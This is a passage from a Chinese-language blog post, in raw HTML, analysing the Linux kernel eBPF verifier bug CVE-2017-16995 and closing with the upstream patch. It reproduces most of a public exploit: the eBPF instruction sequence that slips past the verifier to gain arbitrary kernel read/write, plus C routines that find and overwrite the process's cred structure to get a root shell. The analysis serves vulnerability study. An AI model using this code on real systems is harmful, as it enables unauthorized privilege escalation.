partial copy of pointer\n&quot;</span>,<br>						insn-&gt;src_reg);<br>					<span class="hljs-keyword">return</span> -EACCES;<br>				&#125;<br>				regs[insn-&gt;dst_reg].type = UNKNOWN_VALUE;<br>				regs[insn-&gt;dst_reg].map_ptr = <span class="hljs-literal">NULL</span>;<br>			&#125;<br>[<span class="hljs-number">1</span>]		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-comment">/* case: R = imm</span><br><span class="hljs-comment">			 * remember the value we stored into this reg</span><br><span class="hljs-comment">			 */</span><br>			regs[insn-&gt;dst_reg].type = CONST_IMM;<br>			regs[insn-&gt;dst_reg].imm = insn-&gt;imm;<br>		&#125;<br><br>	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode &gt; BPF_END) &#123;<br>		verbose(<span class="hljs-string">&quot;invalid BPF_ALU opcode %x\n&quot;</span>, opcode);<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	&#125; <span class="hljs-keyword">else</span> &#123;	<span class="hljs-comment">/* all other ALU ops: and, sub, xor, add, ... */</span><br>		......<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
而在真实执行的过程中，由于寄存器类型不一样，在执行第二条跳转语句时存在问题：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">JMP_JNE_K:<br>	<span class="hljs-keyword">if</span> (DST != IMM) &#123;<br>		insn += insn-&gt;off;<br>		CONT_JMP;<br>	&#125;<br>	CONT;<br></code></pre></td></tr></table></figure>
可以看到汇编指令被翻译成movsxd，而此时会发生符号扩展，由原来的0xffffffff扩展成0xffffffffffffffff，再次比较的时候二者并不相同，造成了跳转到[4]处执行，从而绕过了对[4]以后EBPF程序的校验。<br><img src="https://s2.loli.net/2022/09/24/fS2vMsnukzrZ3oj.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
</ol>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>当[4]以后的程序不经过check以后，就可以对[4]的内容进行构造了，利用真正执行时无类型就可以达到内存任意读写了。使用exploit-db上的<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45010">exp</a>，编译完运行即可提权。<br>下面来分析exp的提权原理。eBPF程序逻辑如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">[<span class="hljs-number">0</span>]: ALU_MOV_K(BPF_REG_9, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xffffffff</span>)	<span class="hljs-comment">//r9 = -1</span><br>[<span class="hljs-number">1</span>]: JMP_JNE_K(BPF_REG_9, BPF_REG_0, <span class="hljs-number">0x2</span>, <span class="hljs-number">0xffffffff</span>)	<span class="hljs-comment">//if(r9 == -1)&#123;</span><br>[<span class="hljs-number">2</span>]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r0 = 0</span><br>[<span class="hljs-number">3</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)			<span class="hljs-comment">//exit(0)</span><br>[<span class="hljs-number">4</span>]: LD_MAP_FD(BPF_REG_9, map_addr)						<span class="hljs-comment">//r9 = mapfd</span><br>[<span class="hljs-number">5</span>]: bpf_map_padding<br>----------------------------------------------------------------------------<br>[<span class="hljs-number">6</span>]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r1 = r9</span><br>[<span class="hljs-number">7</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r2 = r10(rbp)</span><br>[<span class="hljs-number">8</span>]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xfffffffc</span>)	<span class="hljs-comment">//r2 = r2-4</span><br>[<span class="hljs-number">9</span>]: ST_MEM_W(BPF_REG_10, BPF_REG_0, <span class="hljs-number">0xfffc</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//[rbp-4] = 0</span><br>[<span class="hljs-number">10</span>]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, <span class="hljs-number">0</span>, <br>           BPF_FUNC_map_lookup_elem)<span class="hljs-comment">//执行BPF_FUNC_map_lookup_elem</span><br>[<span class="hljs-number">11</span>]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x0</span>)			<span class="hljs-comment">//if(r0 == 0)&#123;</span><br>[<span class="hljs-number">12</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)			<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">13</span>]: LDX_MEM_DW(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r6 = [r0] = map[0]</span><br>----------------------------------------------------------------------------<br>[<span class="hljs-number">14</span>]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r1 = r9</span><br>[<span class="hljs-number">15</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r2 = r10</span><br>[<span class="hljs-number">16</span>]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xfffffffc</span>)<span class="hljs-comment">//r2 = r2 - 4</span><br>[<span class="hljs-number">17</span>]: ST_MEM_W(BPF_REG_10, BPF_REG_0, <span class="hljs-number">0xfffc</span>, <span class="hljs-number">0x1</span>)		<span class="hljs-comment">//[rbp-4] = 1</span><br>[<span class="hljs-number">18</span>]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, <span class="hljs-number">0</span>, <br>                   BPF_FUNC_map_lookup_elem)<br>[<span class="hljs-number">19</span>]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x0</span>)			<span class="hljs-comment">//if(r0 == 0)&#123;</span><br>[<span class="hljs-number">20</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)			<span class="hljs-comment">//exit(0)</span><br>[<span class="hljs-number">21</span>]: LDX_MEM_DW(BPF_REG_7, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r7 = [r0] = map[1]</span><br>----------------------------------------------------------------------------<br>[<span class="hljs-number">22</span>]: ALU64_MOV_X(BPF_REG_1, BPF_REG_9, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">23</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">24</span>]: ALU64_ADD_K(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0xfffffffc</span>)<br>[<span class="hljs-number">25</span>]: ST_MEM_W(BPF_REG_10, BPF_REG_0, <span class="hljs-number">0xfffc</span>, <span class="hljs-number">0x2</span>)<br>[<span class="hljs-number">26</span>]: BPF_RAW_INSN(BPF_JMP | BPF_CALL, BPF_REG_0, BPF_REG_0, <span class="hljs-number">0</span>, <br>                   BPF_FUNC_map_lookup_elem)<br>[<span class="hljs-number">27</span>]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">28</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">29</span>]: LDX_MEM_DW(BPF_REG_8, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//r8 = [r0] = map[2]</span><br>----------------------------------------------------------------------------<br>[<span class="hljs-number">30</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r2=r0</span><br>[<span class="hljs-number">31</span>]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r0=0</span><br>[<span class="hljs-number">32</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">// if r6 != 0 jmp 36</span><br>[<span class="hljs-number">33</span>]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r3=[r7]</span><br>[<span class="hljs-number">34</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r2]=r3</span><br>[<span class="hljs-number">35</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">36</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x1</span>)<span class="hljs-comment">//if r6 !=1 1 jmp 39</span><br>[<span class="hljs-number">37</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r2]=r10=rbp</span><br>[<span class="hljs-number">38</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">39</span>]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r7]=r8</span><br>[<span class="hljs-number">40</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br></code></pre></td></tr></table></figure>
<p>下面对这个程序进行分析：<br>首先，[0]<del>[3]已经分析过了下面对后续指令进行分析：<br>第[4]</del>[5]条语句可用由上面的map知识得到，第五条语句是填充语句，当执行完后，会将map的地址存放在r9寄存器中。<br>[6]~[13]语句的类C代码如下，即调用BPF_FUNC_map_lookup_elem(map_add, idx)，并将返回值存到r6寄存器中，即 r6 = map[0]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">[<span class="hljs-number">6</span>]: r1 = r9<br>[<span class="hljs-number">7</span>]: r2 = rbp<br>[<span class="hljs-number">8</span>]: r2 = r2<span class="hljs-number">-4</span><br>[<span class="hljs-number">9</span>]: [rbp+(<span class="hljs-number">-4</span>)] = <span class="hljs-number">0</span> (idx)<br>[<span class="hljs-number">10</span>]: call BPF_FUNC_map_lookup_elem<br>[<span class="hljs-number">11</span>]: <span class="hljs-keyword">if</span> r0 == <span class="hljs-number">0</span>:<br>[<span class="hljs-number">12</span>]: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>)<br>[<span class="hljs-number">13</span>]: r6 = [r0]<br></code></pre></td></tr></table></figure>
<p>[14]<del>[21]同理，将 r7 = map[1]。[22]</del>[29]为 r8 = map[2]，而map的内容可以由用户态传入。<br>最后[30]~[40]分为三个部分</p>
<ol>
<li><p>map[0]为0：r3 = map[1]地址所指的内容, map[2] = r3，由于map1值可控，我们通过此指令组合实现任意地址泄露</p>
</li>
<li><p>map[0]为1：将rbp存储到map[2]中，泄露内核栈基址</p>
</li>
<li><p>map[0]为2：将map[2]的值写入到map[1]的地址上去，我们通过此指令组合实现任意地址写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// r6 == map[0]		r7 == map[1]	r8 == map[2]</span><br>[<span class="hljs-number">30</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)	<span class="hljs-comment">//r2 = r0 = map[2]</span><br>[<span class="hljs-number">31</span>]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)	<span class="hljs-comment">//r0 = 0</span><br>[<span class="hljs-number">32</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//if(r6 != 0) jmp 36</span><br>[<span class="hljs-number">33</span>]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)	<span class="hljs-comment">//r3 = [r7]</span><br>[<span class="hljs-number">34</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)	<span class="hljs-comment">//[r2] = r3</span><br>[<span class="hljs-number">35</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">36</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x1</span>)		<span class="hljs-comment">//if(r6 != 1) jmp 39</span><br>[<span class="hljs-number">37</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)	<span class="hljs-comment">//[r2] = r10 = rbp</span><br>[<span class="hljs-number">38</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">39</span>]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)	<span class="hljs-comment">//[r7] = r8</span><br>[<span class="hljs-number">40</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)		<span class="hljs-comment">//exit</span><br></code></pre></td></tr></table></figure></li>
<li><p>创建map，加载eBPF指令，绑定到socket</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">initialize</span><span class="hljs-params">()</span> </span>&#123;<br>	...<br>	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>), <span class="hljs-number">3</span>, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (mapfd &lt; <span class="hljs-number">0</span>) &#123;<br>		fail(<span class="hljs-string">&quot;failed to create bpf map: &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>	&#125;<br><br>	redact(<span class="hljs-string">&quot;sneaking evil bpf past the verifier\n&quot;</span>);<br>	progfd = load_prog();<br>	<span class="hljs-keyword">if</span> (progfd &lt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-keyword">if</span> (errno == EACCES) &#123;<br>			msg(<span class="hljs-string">&quot;log:\n%s&quot;</span>, bpf_log_buf);<br>		&#125;<br>		fail(<span class="hljs-string">&quot;failed to load prog &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>	&#125;<br><br>	redact(<span class="hljs-string">&quot;creating socketpair()\n&quot;</span>);<br>	<span class="hljs-keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, sockets)) &#123;<br>		fail(<span class="hljs-string">&quot;failed to create socket pair &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>	&#125;<br><br>	redact(<span class="hljs-string">&quot;attaching bpf backdoor to socket\n&quot;</span>);<br>	<span class="hljs-keyword">if</span>(setsockopt(sockets[<span class="hljs-number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="hljs-keyword">sizeof</span>(progfd)) &lt; <span class="hljs-number">0</span>) &#123;<br>		fail(<span class="hljs-string">&quot;setsockopt &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>寻找cred结构体，这里的exp寻找不是基于thread_info结构体中的task_struct，而是通过泄露socket地址从另一个结构体变量中找到cred。在经典版本中，用的是泄露内核栈地址addr，然后用addr &amp; ~(0x400-1)来找thread_info进而找cred。这个原理是内核栈和thread_info位置相邻，地址有对应关系。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">find_cred</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-keyword">uid_t</span> uid = getuid();<br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> skbuff = get_skbuff();<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * struct sk_buff &#123;</span><br><span class="hljs-comment">	 *     [...24 byte offset...]</span><br><span class="hljs-comment">	 *     struct sock     *sk;</span><br><span class="hljs-comment">	 * &#125;;</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 */</span><br><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> sock_addr = read64(skbuff + <span class="hljs-number">24</span>);<br>	msg(<span class="hljs-string">&quot;skbuff =&gt; %llx\n&quot;</span>, skbuff);<br>	msg(<span class="hljs-string">&quot;Leaking sock struct from %llx\n&quot;</span>, sock_addr);	<br>	<span class="hljs-keyword">if</span>(sock_addr &lt; PHYS_OFFSET)&#123;<br>		fail(<span class="hljs-string">&quot;Failed to find Sock address from sk_buff.\n&quot;</span>);<br>	&#125;	<br>		<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * scan forward for expected sk_rcvtimeo value.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * struct sock &#123;</span><br><span class="hljs-comment">	 *    [...]</span><br><span class="hljs-comment">	 *    const struct cred      *sk_peer_cred; </span><br><span class="hljs-comment">	 *    long                    sk_rcvtimeo;             </span><br><span class="hljs-comment">	 *  &#125;;</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++, sock_addr += <span class="hljs-number">8</span>) &#123;<br>		<span class="hljs-keyword">if</span>(read64(sock_addr) == <span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>) &#123;<br>			<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cred_struct = read64(sock_addr - <span class="hljs-number">8</span>);<br>			<span class="hljs-keyword">if</span>(cred_struct &lt; PHYS_OFFSET) &#123;<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br>			<br>			<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> test_uid = (read64(cred_struct + <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>);<br>			<br>			<span class="hljs-keyword">if</span>(test_uid != uid) &#123;<br>				<span class="hljs-keyword">continue</span>;<br>			&#125;<br>                        msg(<span class="hljs-string">&quot;Sock-&gt;sk_rcvtimeo at offset %d\n&quot;</span>, i * <span class="hljs-number">8</span>);<br>                        msg(<span class="hljs-string">&quot;Cred structure at %llx\n&quot;</span>, cred_struct);<br>			msg(<span class="hljs-string">&quot;UID from cred structure: %d, matches the current: %d\n&quot;</span>, test_uid, uid);<br>			<br>			<span class="hljs-keyword">return</span> cred_struct;<br>		&#125;<br>	&#125;<br>	fail(<span class="hljs-string">&quot;failed to find sk_rcvtimeo.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>使用任意地址写功能将cred的uid改为0，起root shell。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hammer_cred</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr)</span> </span>&#123;<br>    msg(<span class="hljs-string">&quot;hammering cred structure at %llx\n&quot;</span>, addr);<br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> w64(w) &#123; write64(addr, (w)); addr += 8; &#125;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> val = read64(addr) &amp; <span class="hljs-number">0xFFFFFFFF</span>UL;<br>    w64(val); <br>    w64(<span class="hljs-number">0</span>); w64(<span class="hljs-number">0</span>); w64(<span class="hljs-number">0</span>); w64(<span class="hljs-number">0</span>);<br>    w64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>); <br>    w64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>); <br>    w64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>); <br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> w64</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/09/24/C32Rj8wGT6a1MFq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
</li>
</ol>
<p><img src="https://s2.loli.net/2022/09/24/lRC9qFITD4wjPty.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>至此漏洞分析结束</p>
<h1 id="漏洞patch"><a href="#漏洞patch" class="headerlink" title="漏洞patch"></a>漏洞patch</h1><p>漏洞的patch如下<a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f">kernel/git/torvalds/linux.git</a><br>这里在do_check里添加了对于BPF_ALU64指令的判断，从而将64和32的比较区分开来，使得预先check和实际run code的检查环境一致，该漏洞无法再被利用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c<br>index <span class="hljs-number">625e358</span>ca765e..c086010ae51ed <span class="hljs-number">100644</span><br>--- a/kernel/bpf/verifier.c<br>+++ b/kernel/bpf/verifier.c<br>@@ <span class="hljs-number">-2408</span>,<span class="hljs-number">7</span> +<span class="hljs-number">2408</span>,<span class="hljs-number">13</span> @@ <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">check_alu_op</span><span class="hljs-params">(struct bpf_verifier_env *env, struct bpf_insn *insn)</span></span><br><span class="hljs-function"> 			 * remember the value we stored into <span class="hljs-keyword">this</span> reg</span><br><span class="hljs-function"> 			 */</span><br><span class="hljs-function"> 			regs[insn-&gt;dst_reg].type </span>= SCALAR_VALUE;<br>-			__mark_reg_known(regs + insn-&gt;dst_reg, insn-&gt;imm);<br>+			<span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;<br>+				__mark_reg_known(regs + insn-&gt;dst_reg,<br>+						 insn-&gt;imm);<br>+			&#125; <span class="hljs-keyword">else</span> &#123;<br>+				__mark_reg_known(regs + insn-&gt;dst_reg,<br>+						 (u32)insn-&gt;imm);<br>+			&#125;<br> 		&#125;<br> <br> 	&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode &gt; BPF_END) &#123;<br></code></pre></td></tr></table></figure>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="http://p4nda.top/2019/01/18/CVE-2017-16995">http://p4nda.top/2019/01/18/CVE-2017-16995</a></p>
<p><a target="_blank" rel="noopener" href="https://v1ckydxp.github.io/2019/09/02/2019-09-02-cve-2017-16995%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://v1ckydxp.github.io/2019/09/02/2019-09-02-cve-2017-16995%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7782">https://xz.aliyun.com/t/7782</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2212">https://xz.aliyun.com/t/2212</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/10/25/XX%E7%89%B9%E6%8B%9B%E5%A4%8D%E4%B9%A0/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">XX特招复习</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
